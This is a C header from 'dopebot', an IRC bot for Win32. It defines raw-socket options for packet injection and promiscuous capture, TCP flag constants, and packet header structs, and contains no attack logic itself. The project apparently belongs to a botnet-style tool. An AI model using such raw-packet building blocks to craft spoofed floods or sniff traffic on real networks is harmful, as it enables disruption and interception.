/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#define IP_HDRINCL 2
#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)

#define ACK 0x10
#define FIN 0x01
#define PSH 0x08
#define RST 0x04
#define SYN 0x02
#define URG 0x20

typedef struct tcphdr
{
	USHORT th_sport;
	USHORT th_dport;
	unsigned int th_seq;
	unsigned int th_ack;
	unsigned char th_lenres;
	unsigned char th_flag;
	USHORT th_win;
	USHORT th_sum;
	USHORT th_urp;
} TCPHEADER; 

typedef struct iphdr
{
	unsigned char h_verlen;
	unsigned char tos;
	unsigned short total_len;
	unsigned short ident;
	unsigned short frag_and_flags;
	unsigned char  ttl;
	unsigned char proto;
	unsigned short checksum;
	unsigned int sourceIP;
	unsigned int destIP;
} IPHEADER;

typedef struct psdhdr
{
	unsigned long saddr;
	unsigned long daddr;
	char mbz;
	char ptcl;
	unsigned short tcpl;
} PSDHEADER; 

typedef struct udphdr
{
	unsigned short source;
	unsigned short dest;
    unsigned short length;
    unsigned short checksum;
} UDPHEADER;
        
typedef struct icmphdr
{
	unsigned char  type;
    unsigned char  subcode;
    unsigned short checksum;
	unsigned short id;
	unsigned short seq;

} ICMPHEADER;